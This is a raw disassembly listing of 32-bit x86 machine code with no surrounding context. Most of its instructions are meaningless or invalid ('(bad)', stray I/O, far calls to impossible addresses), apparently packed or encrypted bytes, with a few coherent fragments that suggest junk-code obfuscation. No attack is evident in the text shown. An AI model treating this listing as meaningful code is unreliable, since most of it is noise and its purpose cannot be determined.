  4020cc:	or     eax,0x26be46a4
  4020d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020d2:	mov    eax,0xb100f735
  4020d7:	push   cs
  4020d8:	aam    0x8e
  4020da:	add    eax,0xaa7aa301
  4020df:	js     0x40214f
  4020e1:	dec    ebx
  4020e2:	mov    ds:0x8d9e8464,al
  4020e7:	jle    0x40207f
  4020e9:	and    bh,bh
  4020eb:	ret    
  4020ec:	into   
  4020ed:	xor    DWORD PTR [edx],0xc60444e3
  4020f3:	add    eax,0x7fdd47bb
  4020f8:	call   0xf086:0xc2ac97fb
  4020ff:	fisub  DWORD PTR [esi+edx*2]
  402102:	sbb    edx,DWORD PTR [eax+0x5b22d9d9]
  402108:	cmp    cl,BYTE PTR ds:0x1eb88b90
  40210e:	popf   
  40210f:	mov    dh,0xc7
  402111:	inc    edx
  402112:	shl    DWORD PTR [ebx+0xd],1
  402115:	jge    0x40218a
  402117:	adc    eax,0xddf1fc09
  40211c:	inc    ebp
  40211d:	lds    eax,FWORD PTR ds:0xd59e0023
  402123:	sbb    ch,dl
  402125:	and    al,0x2b
  402127:	xchg   esp,eax
  402128:	(bad)  
  402129:	cmp    esp,DWORD PTR [edi-0x7468e795]
  40212f:	push   ecx
  402130:	aam    0x8d
  402132:	adc    al,0xd4
  402134:	mov    dh,0x8e
  402136:	inc    edx
  402137:	mov    edi,0x6e40e759
  40213c:	xchg   esp,eax
  40213d:	push   edx
  40213e:	or     eax,0xfee25268
  402143:	xchg   esp,esi
  402145:	push   0xffffff87
  402147:	popf   
  402148:	in     al,dx
  402149:	jmp    0x76a40f69
  40214e:	imul   esp,DWORD PTR [eax-0x55],0xf69e98d8
  402155:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402156:	sbb    al,0x78
  402158:	jge    0x4020f8
  40215a:	ret    
  40215b:	aaa    
  40215c:	mov    edi,0x59b9130b
  402161:	inc    edx
  402162:	xor    al,0x7c
  402164:	fcomi  st,st(4)
  402166:	dec    edi
  402167:	or     eax,0x334749cb
  40216c:	leave  
  40216d:	xchg   ecx,eax
  40216e:	popa   
  40216f:	inc    esp
  402170:	dec    BYTE PTR [ebx+0x5c]
  402173:	xchg   edi,eax
  402174:	and    eax,0x5c28b45d
  402179:	inc    ebp
  40217a:	xchg   esp,eax
  40217b:	mov    BYTE PTR [edi+0x55],ch
  40217e:	dec    ebp
  40217f:	mov    ds:0x6be8f631,al
  402184:	sub    eax,0x4c4e873
  402189:	daa    
  40218a:	adc    eax,0x9d598835
  40218f:	push   eax
  402190:	push   ds
  402191:	ror    DWORD PTR [ebx+0x44],0xc3
  402195:	fmul   QWORD PTR [esi]
  402197:	rcr    DWORD PTR [edx-0x442e9e33],cl
  40219d:	add    al,0xfa
  40219f:	fild   QWORD PTR [ecx+0x4990bdf5]
  4021a5:	mov    eax,0x4eee645
  4021aa:	mov    ecx,0x991252b9
  4021af:	and    bl,ch
  4021b1:	or     eax,0x66e83ad5
  4021b6:	sahf   
  4021b7:	cmp    bh,BYTE PTR ds:0x1a84ee11
  4021bd:	jg     0x4021d4
  4021bf:	popf   
  4021c0:	fdiv   QWORD PTR [ecx]
  4021c2:	gs push 0x86493c6a
  4021c8:	push   DWORD PTR [edx]
  4021ca:	xlat   BYTE PTR ds:[ebx]
  4021cb:	adc    DWORD PTR [ebx+0x48],0x5f
  4021cf:	cld    
  4021d0:	aad    0xcb
  4021d2:	cmp    al,0x56
  4021d4:	ins    DWORD PTR es:[edi],dx
  4021d5:	popf   
  4021d6:	stc    
  4021d7:	jl     0x4021c9
  4021d9:	jns    0x402256
  4021db:	push   cs
  4021dc:	sbb    edi,DWORD PTR ds:0xad6963f4
  4021e2:	popa   
  4021e3:	xor    eax,0x88f4458b
  4021e8:	push   eax
  4021e9:	rcl    BYTE PTR [ecx+0x55],0x1b
  4021ed:	iret   
  4021ee:	lea    edx,[ecx+ecx*8+0x35]
  4021f2:	cs mov gs,edi
  4021f5:	dec    edi
  4021f6:	daa    
  4021f7:	pop    es
  4021f8:	(bad)  
  4021f9:	(bad)  
  4021fa:	test   BYTE PTR [eax*8+0x5632104a],0x3c
  402202:	and    DWORD PTR [edx+0x4d],0xffffffe0
  402206:	loop   0x40227c
  402208:	idiv   DWORD PTR [ebx+esi*1]
  40220b:	inc    edx
  40220c:	lahf   
  40220d:	dec    ebp
  40220e:	sbb    al,0xc6
  402210:	sar    BYTE PTR [edi],1
  402212:	jle    0x402250
  402214:	clc    
  402215:	mov    esi,0x278ae3dd
  40221a:	xor    DWORD PTR [esi+0x15de64e0],ebx
  402220:	inc    edx
  402221:	dec    esp
  402222:	mov    eax,0x9d829591
  402227:	cmc    
  402228:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402229:	les    edx,FWORD PTR [ecx+0xc]
  40222c:	cmp    eax,0x868ad871
  402231:	mov    ecx,0x50ceefe6
  402236:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402237:	sti    
  402238:	jle    0x4022ae
  40223a:	push   eax
  40223b:	push   ss
  40223c:	xchg   edi,eax
  40223d:	jne    0x4021f3
  40223f:	mov    BYTE PTR [ebp+0x7c96d8e0],ah
  402245:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402246:	mov    edi,0x5213ebaa
  40224b:	repz push 0x4ce9847c
  402251:	sbb    cl,BYTE PTR [ecx]
  402253:	icebp  
  402254:	inc    ebp
  402255:	gs push ebp
  402257:	dec    esi
  402258:	jo     0x4021e7
  40225a:	and    ax,0x6ead
  40225e:	pop    ds
  40225f:	sahf   
  402260:	sahf   
  402261:	dec    ecx
  402262:	cmp    esi,ecx
  402264:	imul   ecx,DWORD PTR [ecx-0x5e],0xffffffe5
  402268:	cld    
  402269:	cmp    DWORD PTR [ebx+0x6604a966],ebp
  40226f:	in     al,dx
  402270:	and    DWORD PTR [edi-0x98ebafe],edx
  402276:	lods   al,BYTE PTR ds:[esi]
  402277:	cwde   
  402278:	sbb    cl,BYTE PTR [ebx+0x47]
  40227b:	cmc    
  40227c:	sar    DWORD PTR [ebp-0x79],cl
  40227f:	jp     0x4022c2
  402281:	xchg   DWORD PTR ds:[edx],ebx
  402284:	pop    ss
  402285:	test   eax,0xe796626c
  40228a:	sbb    BYTE PTR [ebx-0x41],cl
  40228d:	mov    bh,0x2c
  40228f:	mov    dl,0x83
  402291:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402292:	cdq    
  402293:	int3   
  402294:	mov    ah,0xbb
  402296:	arpl   WORD PTR [eax-0x4],di
  402299:	inc    esp
  40229a:	pop    edx
  40229b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40229c:	jo     0x4022a8
  40229e:	cmp    ah,BYTE PTR [edi-0x6]
  4022a1:	sub    eax,0x33d5e660
  4022a6:	mov    BYTE PTR [ecx+0x42aef125],0x0
  4022ad:	xor    eax,0x30042af
  4022b2:	(bad)  
  4022b3:	cmp    DWORD PTR [ecx],eax
  4022b5:	jne    0x402dc8
  4022bb:	mov    eax,DWORD PTR [ebp+0x8]
  4022be:	mov    ecx,DWORD PTR [ebp-0x18]
  4022c1:	sbb    DWORD PTR ds:0x42afb5,0x2700
  4022cb:	xor    eax,esi
  4022cd:	add    eax,edi
  4022cf:	jmp    0x40256e
  4022d4:	xlat   BYTE PTR ds:[ebx]
  4022d5:	cmp    eax,0xd9d5d1c7
  4022da:	fxch   st(1)
  4022dc:	mov    edi,0xd8682c5b
  4022e1:	sbb    bh,BYTE PTR [ecx+ebx*1+0x78780904]
  4022e8:	(bad)  
  4022e9:	jle    0x402363
  4022eb:	js     0x402344
  4022ed:	cmp    eax,0x52050ece
  4022f2:	fcmovnb st,st(2)
  4022f4:	mov    ds:0x6e643d77,eax
  4022f9:	and    al,0x59
  4022fb:	stos   DWORD PTR es:[edi],eax
  4022fc:	and    al,0x37
  4022fe:	ds jae 0x402311
  402301:	pop    ss
  402302:	pop    edi
  402303:	or     BYTE PTR [ecx+0x1d48b7aa],bh
  402309:	jnp    0x4022f9
  40230b:	jecxz  0x40236c
  40230d:	call   FWORD PTR [ebp+0x79]
  402310:	ds pop eax
  402312:	xor    BYTE PTR [esi+0x66fe8c78],0x54
  402319:	add    BYTE PTR es:[ecx+0x1],dh
  40231d:	jmp    0x4022d8
  40231f:	jg     0x40236e
  402321:	jns    0x402358
  402323:	shr    dh,cl
  402325:	popf   
  402326:	push   esp
  402327:	jl     0x4022c9
  402329:	push   ebp
  40232a:	push   ds
  40232b:	jns    0x40236e
  40232d:	shl    DWORD PTR [ecx],1
  40232f:	pop    ds
  402330:	in     al,0x3a
  402332:	or     bh,dl
  402334:	aad    0xf9
  402336:	pop    ecx
  402337:	push   ds
  402338:	adc    eax,0xf50cc163
  40233d:	sub    al,0x0
  40233f:	ds loop 0x4022d0
  402342:	push   ecx
  402343:	mov    DWORD PTR [edi-0x27],edi
  402346:	mov    dh,0xbe
  402348:	sbb    BYTE PTR [ebx+0x13],ah
  40234b:	jge    0x402301
  40234d:	xor    DWORD PTR [ecx+0x3d76f027],eax
  402353:	das    
  402354:	test   BYTE PTR [ebx+0x401c1db7],ah
  40235a:	stc    
  40235b:	add    al,0x30
  40235d:	sbb    esi,DWORD PTR [eax-0x46cb3233]
  402363:	adc    al,0x1d
  402365:	ja     0xe1310ebe
  40236b:	sbb    ah,bl
  40236d:	xchg   ebx,eax
  40236e:	(bad)
  402372:	dec    ebx
  402373:	pop    ebx
  402374:	pop    ecx
  402375:	lock add BYTE PTR [edi+0x5ec19387],ch
  40237c:	loop   0x40231c
  40237e:	and    dh,BYTE PTR [esi-0x6f]
  402381:	gs into 
  402383:	outs   dx,BYTE PTR ds:[esi]
  402384:	sbb    BYTE PTR ds:0x56ac3c0e,ch
  40238a:	pop    ss
  40238b:	repnz push ss
  40238d:	bound  ebx,QWORD PTR [edi+0x76953252]
  402393:	in     al,dx
  402394:	js     0x402377
  402396:	hlt    
  402397:	xor    dl,BYTE PTR [esi-0x7b]
  40239a:	mov    DWORD PTR [edx-0x35189219],edi
  4023a0:	dec    ebp
  4023a1:	xchg   DWORD PTR [esi],ebp
  4023a3:	add    ah,dh
  4023a5:	fnstenv [ecx]
  4023a7:	aam    0x59
  4023a9:	dec    edx
  4023aa:	xchg   ecx,eax
  4023ab:	pop    esi
  4023ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023ad:	fiadd  DWORD PTR [edi-0x5f6c8b3f]
  4023b3:	dec    esi
  4023b4:	(bad)  
  4023b6:	jmp    0x8cf82fe6
  4023bb:	fdivr  DWORD PTR ds:0xecd2f231
  4023c1:	retf   0x1b94
  4023c4:	dec    esp
  4023c5:	jnp    0x402404
  4023c7:	scas   al,BYTE PTR es:[edi]
  4023c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023c9:	xor    bh,bh
  4023cb:	mov    esi,0x1a641bf1
  4023d0:	je     0x402375
  4023d2:	lods   eax,DWORD PTR ds:[esi]
  4023d3:	push   es
  4023d4:	mov    ds:0xa0ac4b0a,al
  4023d9:	out    0x8c,al
  4023db:	add    al,0xa6
  4023dd:	hlt    
  4023de:	icebp  
  4023df:	jmp    0xd30b:0xc58fd44c
  4023e6:	xchg   edx,eax
  4023e7:	ss iret 
  4023e9:	push   0xffffffef
  4023eb:	cmp    ch,BYTE PTR [edi-0x70]
  4023ee:	xor    BYTE PTR [ecx+0x3d],cl
  4023f1:	aad    0xc5
  4023f3:	ficomp WORD PTR ds:0x224834a5
  4023f9:	dec    edi
  4023fa:	call   0x29e0:0xf79178d4
  402401:	sub    al,0x67
  402403:	and    eax,0x44cf8c4e
  402408:	call   0xd3ed:0xaec1faa0
  40240f:	mov    bl,0x68
  402412:	xchg   edi,eax
  402413:	dec    eax
  402414:	or     eax,0x998a02b6
  402419:	jge    0x40245c
  40241b:	pop    ebp
  40241c:	stos   DWORD PTR es:[edi],eax
  40241d:	lahf   
  40241e:	adc    DWORD PTR [ebx-0x3f],esp
  402421:	mov    dl,0x21
  402423:	dec    ecx
  402424:	cmp    dh,BYTE PTR [eax+0x4c385597]
  40242a:	ins    DWORD PTR es:[edi],dx
  40242b:	cwde   
  40242c:	js     0x402438
  40242e:	sahf   
  40242f:	jnp    0x402444
  402431:	xor    dl,bl
  402433:	outs   dx,BYTE PTR ds:[esi]
  402434:	xor    BYTE PTR [eax+0x44],bl
  402437:	jge    0x402496
  402439:	xchg   esp,eax
  40243a:	(bad)  
  40243c:	sub    esi,DWORD PTR [ebp+0xb]
  40243f:	push   ecx
  402440:	popf   
  402441:	dec    esp
  402442:	adc    BYTE PTR [ebx+eiz*4],0xf8
  402446:	dec    ch
  402448:	rcl    DWORD PTR [edx],cl
  40244a:	jno    0x4024ad
  40244c:	nop
  40244d:	jbe    0x402474
  40244f:	jmp    DWORD PTR [eax+0x17]
  402452:	xor    eax,0x9b36d563
  402457:	mov    eax,0x2a8fde92
  40245c:	popf   
  40245d:	pop    esp
  40245e:	push   ds
  40245f:	mov    eax,ds:0xb6f2cbc5
  402464:	std    
  402465:	dec    ebp
  402466:	fdivr  QWORD PTR [edx]
  402468:	jg     0x4023f8
  40246a:	bound  ecx,QWORD PTR [edi+0x69a45726]
  402470:	jp     0x402410
  402472:	mov    edx,0x293fabba
  402477:	push   ds
  402478:	xor    eax,0x57cdf434
  40247d:	mov    ds:0xb6c3aeaf,al
  402483:	dec    esi
  402484:	fiadd  DWORD PTR [esi]
  402486:	in     al,dx
  402487:	sbb    eax,0x43707753
  40248c:	mov    dh,0xb1
  40248e:	adc    al,0xb0
  402490:	ss inc ecx
  402492:	mov    dh,ah
  402494:	xor    DWORD PTR [ebp+0x1e],ebx
  402497:	push   edx
  402498:	jno    0x4024f0
  40249a:	xor    eax,0xccbdfd41
  40249f:	mov    cl,0xa5
  4024a1:	pop    eax
  4024a2:	repnz sub bl,BYTE PTR [ebx+0x72e0747e]
  4024a9:	xchg   di,ax
  4024ab:	push   ebp
  4024ac:	adc    al,0xf7
  4024ae:	inc    edx
  4024af:	out    0x39,eax
  4024b1:	(bad)  
  4024b3:	or     BYTE PTR [edi+0x69241b0d],0x96
  4024ba:	dec    edx
  4024bb:	mov    ebx,DWORD PTR [edi]
  4024bd:	pop    eax
  4024be:	mov    bl,BYTE PTR [edi+0x0]
  4024c1:	add    DWORD PTR [edx+0x1f0c056a],esi
  4024c7:	and    al,BYTE PTR [edx+esi*1+0x14565795]
  4024ce:	iret   
  4024cf:	in     eax,dx
  4024d0:	xchg   edi,eax
  4024d1:	ret    
  4024d2:	xor    ch,BYTE PTR [ebx]
  4024d4:	mov    ecx,0xf72d26ca
  4024d9:	jecxz  0x402465
  4024db:	repz in eax,dx
  4024dd:	jns    0x40252a
  4024df:	mov    al,ds:0xde759e76
  4024e4:	cmp    BYTE PTR [esi+0x24],ch
  4024e7:	inc    esp
  4024e8:	or     bl,BYTE PTR [ecx]
  4024ea:	(bad)  
  4024eb:	pop    ebp
  4024ec:	les    edx,FWORD PTR [ecx+0x26]
  4024ef:	inc    edi
  4024f0:	jmp    0x402501
  4024f2:	gs push ebp
  4024f4:	push   edi
  4024f5:	popa   
  4024f6:	lock (bad) 
  4024f8:	not    DWORD PTR fs:[eax-0x80]
  4024fc:	stos   DWORD PTR es:[edi],eax
  4024fd:	(bad)  
  4024fe:	sbb    DWORD PTR [esi],edi
  402500:	daa    
  402501:	pop    ebp
  402502:	xchg   ebx,eax
  402503:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402504:	xchg   BYTE PTR [edx+eiz*2],bl
  402507:	dec    ebp
  402508:	dec    BYTE PTR [edx]
  40250a:	add    DWORD PTR [ecx],0x5f
  40250d:	icebp  
  40250e:	stos   DWORD PTR es:[edi],eax
  40250f:	pop    es
  402510:	sub    ah,BYTE PTR [edi-0x4c]
  402513:	iret   
  402514:	xor    ebp,esi
  402516:	sbb    eax,0xbe3569d1
  40251b:	lahf   
  40251c:	test   eax,0xcd6730bd
  402521:	mov    ch,0xe5
  402523:	mov    bh,0xbe
  402525:	rol    BYTE PTR [ebp-0x522ee03a],1
  40252b:	sbb    bh,BYTE PTR [edx+0x20]
  40252e:	add    DWORD PTR [ebx-0x6aa512b],ecx
  402534:	es mov esi,0x59bad96b
  40253a:	arpl   WORD PTR [ecx],cx
  40253c:	push   ss
  40253d:	out    0x3e,al
  40253f:	sub    al,0xcf
  402541:	mov    eax,ds:0xdeceb139
  402546:	rcl    DWORD PTR [edx+0x5b5b68d1],0x72
  40254d:	push   edx
  40254e:	stc    
  40254f:	jecxz  0x4025bd
  402551:	lods   eax,DWORD PTR ds:[esi]
  402552:	test   BYTE PTR fs:0xe10c0e75,dl
  402559:	inc    esp
  40255a:	fist   WORD PTR [edi]
  40255c:	push   es
  40255d:	mov    ch,0xa3
  40255f:	sub    BYTE PTR [ecx],al
  402561:	mov    ebx,0xe6a0115d
  402566:	sbb    edi,ebx
  402568:	xor    dh,BYTE PTR [edx-0x54e07a17]
  40256e:	cmp    DWORD PTR [ecx],eax
  402570:	jne    0x402832
  402576:	mov    eax,DWORD PTR [ebp+0x8]
  402579:	mov    ecx,DWORD PTR [ebp-0x10]
  40257c:	xor    eax,esi
  40257e:	add    eax,edi
  402580:	mov    DWORD PTR [ecx],eax
  402582:	jmp    0x402821
  402587:	aas    
  402588:	retf   
  402589:	ret    0xcace
  40258c:	aad    0xd3
  40258e:	fld    DWORD PTR [ecx+eiz*1+0x26]
  402592:	inc    edx
  402593:	add    ecx,DWORD PTR [ecx+0x3]
  402596:	mov    ch,0x8a
  402598:	vmread DWORD PTR [eax-0x2],edi
  40259c:	jle    0x402616
  40259e:	js     0x402566
  4025a0:	leave  
  4025a1:	repnz xor eax,DWORD PTR [edx]
  4025a4:	mov    ds:0x50363e0b,al
  4025a9:	jo     0x4025c0
  4025ab:	and    al,0xc8
  4025ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025ae:	(bad)  [esi]
  4025b0:	(bad)  [esi+0x75]
  4025b3:	or     eax,edx
  4025b5:	sar    DWORD PTR [ecx-0x7e],1
  4025b8:	in     eax,dx
  4025b9:	inc    edi
  4025ba:	and    BYTE PTR [ebp-0x1d],al
  4025bd:	jge    0x4025a3
  4025bf:	les    edx,FWORD PTR [edi+0x7d]
  4025c2:	call   0x36c5:0x4742e931
  4025c9:	je     0x4025b3
  4025cb:	lahf   
  4025cc:	jb     0x40262e
  4025ce:	add    DWORD PTR [ecx+0x4b],esp
  4025d1:	sub    al,0xbf
  4025d3:	stc    
  4025d4:	inc    ebx
  4025d5:	sahf   
  4025d6:	sti    
  4025d7:	xlat   BYTE PTR ds:[ebx]
  4025d8:	stos   BYTE PTR es:[edi],al
  4025d9:	ror    bh,0x15
  4025dc:	or     DWORD PTR [eax-0x6d4401ad],0x30
  4025e3:	(bad)  
  4025e4:	or     al,0x7a
  4025e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025e7:	xchg   ecx,eax
  4025e8:	and    eax,esp
  4025ea:	cmp    BYTE PTR [ecx-0x2b],dh
  4025ed:	(bad)  [ebp-0x29]
  4025f0:	out    dx,eax
  4025f1:	sbb    cl,BYTE PTR [edx-0x691c26a5]
  4025f7:	push   0xffffff8b
  4025f9:	pop    ds
  4025fa:	push   ecx
  4025fb:	cmp    al,0xf6
  4025fd:	mov    ebx,ss
  4025ff:	mov    bl,0x9b
  402601:	xchg   DWORD PTR [edx],esi
  402603:	add    BYTE PTR [ecx+0x7782b5a7],dl
  402609:	fld    DWORD PTR [eax+0x2a]
  40260c:	pop    es
  40260d:	mov    al,ds:0xeebe843b
  402612:	jg     0x4025a1
  402614:	pop    edx
  402615:	dec    edx
  402616:	stos   DWORD PTR es:[edi],eax
  402617:	pop    ss
  402618:	or     BYTE PTR [esi-0x3b3e6741],ch
  40261e:	mov    eax,0xa29d154d
  402623:	mov    ah,0x99
  402625:	mov    BYTE PTR [eax-0x7f],0xf1
  402629:	cmp    eax,0x980dcc1a
  40262e:	jno    0x402639
  402630:	jns    0x4025ce
  402632:	and    ebx,DWORD PTR [ebx]
  402634:	pop    es
  402635:	test   BYTE PTR [edi],0x44
  402638:	lods   eax,DWORD PTR ds:[esi]
  402639:	(bad)  
  40263a:	rcl    BYTE PTR [edx+eiz*2],1
  40263d:	xchg   edx,eax
  40263e:	sub    ch,al
  402640:	push   cs
  402641:	aas    
  402642:	imul   ebx,DWORD PTR [edx-0x72],0xffffffc2
  402646:	push   es
  402647:	adc    bl,BYTE PTR [ecx]
  402649:	leave  
  40264a:	and    ebx,ebx
  40264c:	xor    al,0x59
  40264e:	sub    eax,0xfd450ecc
  402653:	jnp    0x402600
  402655:	int3   
  402656:	cmc    
  402657:	fistp  WORD PTR [eax+0x53]
  40265a:	test   al,0x61
  40265c:	jnp    0x40268b
  40265e:	inc    eax
  40265f:	jno    0x4025ef
  402661:	aas    
  402662:	mov    eax,0x74ac8db6
  402667:	push   esi
  402668:	fsub   DWORD PTR [edx+0x6a]
  40266b:	cwde   
  40266c:	stc    
  40266d:	mov    ebx,0x7718c65d
  402672:	ins    BYTE PTR es:[edi],dx
  402673:	call   DWORD PTR [esi]
  402675:	adc    al,0x41
  402677:	loope  0x4026eb
  402679:	cli    
  40267a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40267b:	sbb    al,0x52
  40267d:	in     al,0x3c
  40267f:	adc    eax,0xfea53dff
  402684:	nop
  402685:	pop    eax
  402686:	jb     0x40262b
  402688:	or     eax,0xeab9cc2b
  40268d:	xor    al,0xf7
  40268f:	mov    bl,0x79
  402691:	mov    ch,0x5d
  402693:	sbb    al,0x9c
  402695:	xor    dl,BYTE PTR [edx]
  402697:	cmp    al,0x37
  402699:	jb     0x402672
  40269b:	dec    edi
  40269c:	mov    ebx,0x3b02ff
  4026a1:	sub    al,0x90
  4026a3:	dec    esi
  4026a4:	jg     0x402638
  4026a6:	or     al,dh
  4026a8:	fisubr DWORD PTR [ecx+0x29965e75]
  4026ae:	jno    0x4026ea
  4026b0:	sub    al,0xa7
  4026b2:	add    BYTE PTR ss:[esp+ecx*1-0xd],ah
  4026b7:	mov    ds:0x15cfbef2,al
  4026bc:	mov    cl,BYTE PTR [esi]
  4026be:	mov    ebp,0xaf9323d
  4026c3:	add    edx,DWORD PTR [ebx+eiz*8-0x6a]
  4026c7:	sbb    dh,al
  4026c9:	cmp    BYTE PTR [eax+0x5e],dh
  4026cc:	or     esp,DWORD PTR [ebp+0x64e82d4b]
  4026d2:	add    cl,BYTE PTR ss:[ebx]
  4026d5:	test   BYTE PTR [eax],bh
  4026d7:	fiadd  DWORD PTR [edx-0x659cdd12]
  4026dd:	(bad)  
  4026de:	repnz addr16 xor eax,0x54a71964
  4026e5:	push   ebp
  4026e6:	hlt    
  4026e7:	jmp    0x2b07d516
  4026ec:	hlt    
  4026ed:	test   eax,0x19db8715
  4026f2:	mov    al,0x15
  4026f4:	in     al,dx
  4026f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026f6:	and    eax,0x8ed326c0
  4026fb:	popf   
  4026fc:	lea    edx,[ebx]
  4026fe:	xor    al,0x94
  402700:	push   edx
  402701:	fs pop edx
  402703:	jns    0x40271e
  402705:	jmp    0x2c3933e4
  40270a:	in     eax,0x51
  40270c:	shl    esi,0x9d
  40270f:	sbb    al,0x39
  402711:	jle    0x40272f
  402713:	mov    bl,0x8
  402715:	das    
  402716:	in     al,dx
  402717:	mov    ah,0x5d
  402719:	loop   0x402780
  40271b:	loop   0x4026ce
  40271d:	pop    ebp
  40271e:	and    al,BYTE PTR [eax-0x23]
  402721:	ja     0x40279d
  402723:	xor    al,0x4c
  402725:	stc    
  402726:	push   eax
  402727:	and    ebx,DWORD PTR [eax+0x4f095631]
  40272d:	sbb    BYTE PTR [eax+ecx*1],cl
  402730:	daa    
  402731:	mov    esi,0x1f7c7ba8
  402736:	js     0x4026f3
  402738:	inc    ecx
  402739:	mov    dh,0xa9
  40273b:	(bad)
  40273f:	rcl    BYTE PTR ds:0xbb2d1cf7,0x9b
  402746:	push   ebp
  402747:	sub    eax,0xb68d1e6b
  40274c:	loop   0x402711
  40274e:	out    0x18,eax
  402750:	lea    esp,[eax+0x538e6a74]
  402756:	arpl   WORD PTR [esi-0x7f],cx
  402759:	hlt    
  40275a:	retf   0xc92
  40275d:	xchg   ecx,eax
  40275e:	aad    0xfc
  402760:	test   DWORD PTR [esi+0x19af41a1],esp
  402766:	push   es
  402767:	add    esp,DWORD PTR [esi+0x1c076aa1]
  40276d:	pop    esi
  40276e:	repnz in eax,dx
  402770:	dec    esp
  402771:	mov    eax,ds:0xab1cf85e
  402776:	(bad)
  402779:	mov    al,0x93
  40277b:	ret    
  40277c:	js     0x402719
  40277e:	jb     0x4027e2
  402780:	inc    ebp
  402781:	adc    esp,DWORD PTR [ecx+eax*8+0x38]
  402785:	mov    dl,0xcb
  402787:	outs   dx,BYTE PTR ds:[esi]
  402788:	ja     0x40272e
  40278a:	adc    al,0x70
  40278c:	mov    ch,0x33
  40278e:	jae    0x40278b
  402790:	cdq    
  402791:	sub    al,cl
  402793:	dec    eax
  402794:	pop    edx
  402795:	jmp    0x4027cf
  402797:	stos   DWORD PTR es:[edi],eax
  402798:	test   DWORD PTR [edx],ebx
  40279a:	sbb    BYTE PTR [ecx+0x334ca4eb],al
  4027a0:	push   eax
  4027a1:	mov    dl,BYTE PTR [esi+esi*2+0x69f61a34]
  4027a8:	aas    
  4027a9:	or     al,0x39
  4027ab:	xchg   ecx,eax
  4027ac:	enter  0x788b,0x11
  4027b0:	retf   
  4027b1:	or     BYTE PTR [edi],bh
  4027b3:	repnz xchg ecx,eax
  4027b5:	inc    esp
  4027b6:	mov    ah,0xac
  4027b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027b9:	mov    al,ds:0xc19a6552
  4027be:	in     al,dx
  4027bf:	dec    ebp
  4027c0:	les    edx,FWORD PTR [ebx-0x5e]
  4027c3:	mov    ah,0x78
  4027c5:	div    ebx
  4027c7:	cmp    DWORD PTR [eax-0xb7a110],ebx
  4027cd:	push   cs
  4027ce:	mov    cl,0x5d
  4027d0:	cmp    ecx,DWORD PTR [ecx+0x64]
  4027d3:	psraw  mm3,QWORD PTR [edx+esi*4-0x64]
  4027d8:	js     0x4027b0
  4027da:	or     ah,BYTE PTR [ecx]
  4027dc:	push   ebp
  4027dd:	pop    es
  4027de:	int    0x72
  4027e0:	xor    BYTE PTR [esi],dl
  4027e2:	mov    ds:0xe112cf0,eax
  4027e7:	in     al,dx
  4027e8:	push   esp
  4027e9:	sbb    BYTE PTR [esi-0x513cccb],dl
  4027ef:	(bad)  
  4027f1:	in     al,0x50
  4027f3:	push   0xffffff8b
  4027f5:	mov    cl,0x35
  4027f7:	and    ecx,DWORD PTR [edx-0x1e9b78e1]
  4027fd:	jns    0x40280e
  4027ff:	sbb    eax,0x290d989
  402804:	stc    
  402805:	sub    BYTE PTR [eax-0x5c],0x1
  402809:	mov    bl,0x7b
  40280b:	add    al,0xcb
  40280d:	gs cli 
  40280f:	stc    
  402810:	les    eax,FWORD PTR [edx+eiz*1-0x2cf553d9]
  402817:	adc    eax,0x2641be8b
  40281c:	out    dx,eax
  40281d:	cmp    eax,0x8b511f97
  402822:	inc    ebp
  402823:	lock mov ecx,DWORD PTR [ebp+0x10]
  402827:	xor    ecx,esi
  402829:	mov    edx,0xffcd8d68
  40282e:	sub    edx,ecx
  402830:	add    DWORD PTR [eax],edx
  402832:	mov    eax,ds:0x41ebba
  402837:	mov    eax,DWORD PTR [eax]
  402839:	mov    cx,WORD PTR [ebp-0x4]
  40283d:	movzx  ecx,cx
  402840:	add    ecx,DWORD PTR [eax]
  402842:	mov    DWORD PTR [ebp-0x18],ecx
  402845:	mov    eax,DWORD PTR [ebp+0xc]
  402848:	mov    ecx,DWORD PTR [ebp+0xc]
  40284b:	xor    eax,esi
  40284d:	lea    eax,[eax+eax*1+0x327298]
  402854:	xor    ecx,esi
  402856:	sub    ecx,eax
  402858:	mov    ax,WORD PTR [ebp-0x4]
  40285c:	movzx  eax,ax
  40285f:	cmp    eax,ecx
  402861:	mov    eax,DWORD PTR [ebp+0x10]
  402864:	movzx  ecx,WORD PTR [ebp-0x4]
  402868:	jg     0x402dbb
  40286e:	xor    eax,esi
  402870:	jmp    0x402b0f
  402875:	ret    
  402876:	ror    ecx,cl
  402878:	into   
  402879:	(bad)  
  40287b:	fcmovnbe st,st(1)
  40287d:	out    0x1c,eax
  40287f:	dec    esp
  402880:	stos   BYTE PTR es:[edi],al
  402881:	(bad)  
  402882:	jecxz  0x40287a
  402884:	lock or BYTE PTR [eax+edi*2],cl
  402888:	js     0x402888
  40288a:	jle    0x402904
  40288c:	js     0x40282d
  40288e:	sub    BYTE PTR [eax-0x7c95424a],bh
  402894:	loopne 0x402896
  402896:	xchg   ebp,eax
  402897:	cmp    esi,DWORD PTR [edi+0x446bfcb6]
  40289d:	push   ss
  40289e:	sbb    eax,0xe8e6b6eb
  4028a3:	and    bh,BYTE PTR [ebx-0x18]
  4028a6:	add    eax,0x9355231d
  4028ab:	sub    esp,DWORD PTR [ebx]
  4028ad:	sbb    BYTE PTR [edi+0x41bebc8b],ch
  4028b3:	xchg   esp,eax
  4028b4:	xor    dl,BYTE PTR [ecx-0x27c20fa9]
  4028ba:	jl     0x4028d2
  4028bc:	pop    ss
  4028bd:	adc    dh,BYTE PTR [eax-0x4fe8f4b]
  4028c3:	or     DWORD PTR [eax],esi
  4028c5:	add    al,0x89
  4028c7:	mov    ebx,0xe04a9461
  4028cc:	addr16 cmp eax,0xd99e5574
  4028d2:	push   ss
